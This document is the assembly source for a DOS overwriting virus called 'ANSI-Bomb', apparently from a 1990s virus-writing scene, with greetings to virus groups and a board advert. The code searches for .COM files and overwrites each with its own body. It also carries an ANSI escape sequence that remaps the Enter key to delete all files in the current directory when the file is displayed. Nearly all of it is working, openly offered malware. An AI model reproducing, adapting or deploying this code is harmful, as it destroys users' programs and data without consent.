;|
;|      ANSI-BOMB BY TESLA 5
;|
;|      THIS VIRUS IS LOSELY BASED ON THE WEFLOW 1993 VIRUS, WHICH WAS BASED
;|      ON TRIDENT OVERWRITING VIRUS, MADE BY .... OF TRIDENT. DON'T TYPE
;|      THIS FILE, OR WHEN YOU PRESS 'ENTER' YOUR DIR WILL BE ERASED. GREETINGS
;|      TO TRIDENT, NUKE, PHALCOM/SKISM AND YAM. YOU DON'T KNOW ME, BUT I DO
;|      KNOW YOU. APOLOGIES TO TRIDENT THAT I MADE THESE LAME VARIANTS OF
;|      YOUR VIRUS, BUT I DON'T KNOW HOW OTHER INFECTION SCHEMES WORK.
;|      REACTIONS ARE WELCOME.
;|

START:          JMP DOIT

                DB 8,8,8
                DB 'I HOPE YOU DON''T HAVE ANSI, BOY!'
                DB 27,'[13;13;"ECHO Y|DEL.";13P'
                DB 26

MSG:
                DB 13,10,'HELLO! WHAT WILL YOU DO ABOUT THIS? BUY ORIGINALS TO AVOID ME AND MY 1500'
                DB 13,10,'NASTY FRIENDS, BECAUSE WE ARE EVERYWHERE!',13,10,'$'

                DB 'ð ANSI-BOMB VIRUS BY TESLA 5 ð'

DOIT:           MOV AH, 4EH

SEEK:           PUSH CS
                POP DS
                LEA DX,FSPEC
                XOR CX,CX
                INT 21H
                JC  DOMSG

                MOV AX,3D02H
                MOV DX,9EH
                INT 21H

                XCHG AX,BX

                MOV AH,40H
                LEA DX,START
                MOV CX,PRGLEN
                INT 21H

                MOV AH,3EH
                INT 21H

                MOV AH,4FH
                JMP SEEK

DOMSG:          XOR CX,CX
                MOV ES,CX
                MOV AL,BYTE PTR ES:[46CH]
                CMP AL,30H
                JA  EINDE

                MOV AH,9
                LEA DX,MSG
                INT 21H

EINDE:          RET

FSPEC           DB '*.COM',0

PRGLEN          EQU $-START

;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
